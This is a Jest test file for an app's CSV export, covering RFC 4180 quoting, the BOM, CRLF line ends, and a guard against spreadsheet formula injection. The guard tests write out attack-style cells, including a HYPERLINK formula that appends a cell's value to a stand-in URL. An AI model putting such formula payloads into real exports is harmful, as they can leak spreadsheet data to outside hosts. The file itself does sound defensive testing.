/**
 * Tests for the CSV writer (spec §8.8, unit W1-6): RFC 4180 quoting, the
 * header row, the UTF-8 BOM, and a round trip through the app's own CSV reader.
 */
import { describe, expect, test } from '@jest/globals';

import { splitCsvRows } from '../domain/importFile';
import { createRandom } from '../test/random';
import { CSV_BOM, CSV_EOL, csvField, csvRow, toCsv } from './csv';

describe('csvField (RFC 4180 quoting)', () => {
  test('plain text and numbers are written as they are', () => {
    expect(csvField('die Stunde')).toBe('die Stunde');
    expect(csvField('über')).toBe('über');
    expect(csvField(12)).toBe('12');
    expect(csvField(2.5)).toBe('2.5');
    expect(csvField(-3)).toBe('-3');
    expect(csvField(true)).toBe('true');
    expect(csvField('')).toBe('');
  });

  test('a comma → the field is quoted', () => {
    expect(csvField('regular, separable')).toBe('"regular, separable"');
  });

  test('a double quote → quoted, and the quote is written twice', () => {
    expect(csvField('He said "hi"')).toBe('"He said ""hi"""');
    expect(csvField('"')).toBe('""""');
  });

  test('a newline (LF, CRLF or a lone CR) → quoted, the newline is kept', () => {
    expect(csvField('line 1\nline 2')).toBe('"line 1\nline 2"');
    expect(csvField('line 1\r\nline 2')).toBe('"line 1\r\nline 2"');
    expect(csvField('line 1\rline 2')).toBe('"line 1\rline 2"');
  });

  test('null, undefined and non-finite numbers → an empty cell', () => {
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
    expect(csvField(Number.NaN)).toBe('');
    expect(csvField(Number.POSITIVE_INFINITY)).toBe('');
  });

  test('spaces and semicolons do not need quotes', () => {
    expect(csvField('  padded  ')).toBe('  padded  ');
    expect(csvField('a;b')).toBe('a;b');
  });
});

/**
 * Spreadsheet apps run a text cell that starts with = + - @ (or a TAB / CR) as
 * a formula. With `guardFormulas` such a TEXT cell gets a leading apostrophe.
 */
describe('csvField with guardFormulas (spreadsheet formula injection)', () => {
  const guard = { guardFormulas: true };

  test("'=' → an apostrophe first, then normal RFC 4180 quoting", () => {
    expect(csvField('=1+1', guard)).toBe("'=1+1");
    // The attack example: quotes and a comma, so the cell is also quoted.
    expect(csvField('=HYPERLINK("http://x/?"&A1,"open")', guard)).toBe(
      '"\'=HYPERLINK(""http://x/?""&A1,""open"")"',
    );
  });

  test("'+' → guarded", () => {
    expect(csvField('+49 30 1234', guard)).toBe("'+49 30 1234");
  });

  test("'-' → guarded (the text '-n' would show as #NAME? otherwise)", () => {
    expect(csvField('-n', guard)).toBe("'-n");
  });

  test("'@' → guarded", () => {
    expect(csvField('@SUM(A1:A9)', guard)).toBe("'@SUM(A1:A9)");
  });

  test('a TAB at the start → guarded (a TAB needs no quotes)', () => {
    expect(csvField('\t=1+1', guard)).toBe("'\t=1+1");
  });

  test('a CR at the start → guarded, and quoted because of the CR', () => {
    expect(csvField('\r=1+1', guard)).toBe('"\'\r=1+1"');
  });

  test('numbers and booleans are never changed (-3 stays -3)', () => {
    expect(csvField(-3, guard)).toBe('-3');
    expect(csvField(-0.5, guard)).toBe('-0.5');
    expect(csvField(true, guard)).toBe('true');
    expect(csvField(Number.NaN, guard)).toBe('');
  });

  test('text that only CONTAINS a trigger character is not changed', () => {
    expect(csvField('a=b', guard)).toBe('a=b');
    expect(csvField('Mon-Fri', guard)).toBe('Mon-Fri');
    expect(csvField('mail@example.org', guard)).toBe('mail@example.org');
    expect(csvField(' =1', guard)).toBe(' =1');
    expect(csvField('', guard)).toBe('');
    expect(csvField(null, guard)).toBe('');
  });

  test('off by default: the value is written as it is', () => {
    expect(csvField('=1+1')).toBe('=1+1');
    expect(csvField('-n', { guardFormulas: false })).toBe('-n');
  });

  test('csvRow passes the option to every cell, and never the array index', () => {
    expect(csvRow(['=a', '-b', 3], guard)).toBe("'=a,'-b,3");
    // Without the option no cell is guarded, also not the 2nd and 3rd (index 1, 2).
    expect(csvRow(['=a', '-b', '+c'])).toBe('=a,-b,+c');
  });
});

describe('toCsv', () => {
  const header = ['date', 'kind', 'cards', 'note'];

  test('starts with the UTF-8 BOM, then the header row', () => {
    const csv = toCsv(header, []);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv.startsWith(CSV_BOM)).toBe(true);
    expect(csv).toBe(CSV_BOM + 'date,kind,cards,note\r\n');
  });

  test('the BOM becomes the bytes EF BB BF in a UTF-8 file', () => {
    const bytes = Buffer.from(toCsv(['a'], []), 'utf8');
    expect([...bytes.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
  });

  test('the BOM can be turned off', () => {
    expect(toCsv(['a', 'b'], [[1, 2]], { bom: false })).toBe('a,b\r\n1,2\r\n');
  });

  test('records are separated (and ended) by CRLF', () => {
    const csv = toCsv(header, [
      ['2026-10-21', 'scheduled', 12, null],
      ['2026-10-22', 'practice', 3, 'Kitchen, words'],
    ]);
    expect(CSV_EOL).toBe('\r\n');
    expect(csv).toBe(
      CSV_BOM +
        'date,kind,cards,note\r\n' +
        '2026-10-21,scheduled,12,\r\n' +
        '2026-10-22,practice,3,"Kitchen, words"\r\n',
    );
  });

  test('header cells are quoted by the same rules', () => {
    expect(csvRow(['a,b', 'c'])).toBe('"a,b",c');
    expect(toCsv(['say "x"'], [], { bom: false })).toBe('"say ""x"""\r\n');
  });

  test('guardFormulas guards text cells in every row, and leaves numbers alone', () => {
    const csv = toCsv(
      ['date', 'deck', 'front', 'interval_before'],
      [
        ['2026-10-21', 'German', '=HYPERLINK("http://x")', -3],
        ['2026-10-22', '@deck', 'die Stunde', 4],
      ],
      { guardFormulas: true, bom: false },
    );
    expect(csv).toBe(
      'date,deck,front,interval_before\r\n' +
        '2026-10-21,German,"\'=HYPERLINK(""http://x"")",-3\r\n' +
        "2026-10-22,'@deck,die Stunde,4\r\n",
    );
    // Off by default: the same rows are written as they are.
    expect(toCsv(['front'], [['=1+1']], { bom: false })).toBe('front\r\n=1+1\r\n');
  });

  test('guardFormulas: a CSV reader gets the value back with one apostrophe in front', () => {
    const values = ['=1+1', '+1', '-n', '@x', '\tx', '\rx', 'plain'];
    const csv = toCsv(['front'], values.map((v) => [v]), { guardFormulas: true, bom: false });
    const parsed = splitCsvRows(csv, ',').slice(1, -1).map((row) => row[0]);
    expect(parsed).toEqual(["'=1+1", "'+1", "'-n", "'@x", "'\tx", "'\rx", 'plain']);
  });

  test('a row with the wrong number of cells throws (values would move columns)', () => {
    expect(() => toCsv(header, [['2026-10-21', 'scheduled', 12]])).toThrow(/row 1 has 3 cells/);
    expect(() => toCsv([], [])).toThrow(/header/);
  });

  test('round trip: the app’s own CSV reader gets every value back', () => {
    const rnd = createRandom('csv-round-trip');
    const pieces = ['die Stunde', 'über', ',', '"', '\n', '\r\n', ' ', 'a"b', 'x,y', '東京', ''];
    const rows: string[][] = [];
    for (let r = 0; r < 60; r++) {
      const row: string[] = [];
      for (let c = 0; c < header.length; c++) {
        let cell = '';
        const parts = rnd.int(0, 4);
        for (let p = 0; p < parts; p++) cell += rnd.pick(pieces);
        row.push(cell);
      }
      rows.push(row);
    }
    const csv = toCsv(header, rows);
    // The reader leaves the BOM and the empty line after the last CRLF to its
    // caller (the import screen removes them), so this test does it here.
    const parsed = splitCsvRows(csv.slice(CSV_BOM.length), ',');
    expect(parsed[parsed.length - 1]).toEqual(['']);
    expect(parsed.slice(0, -1)).toEqual([header, ...rows]);
  });
});
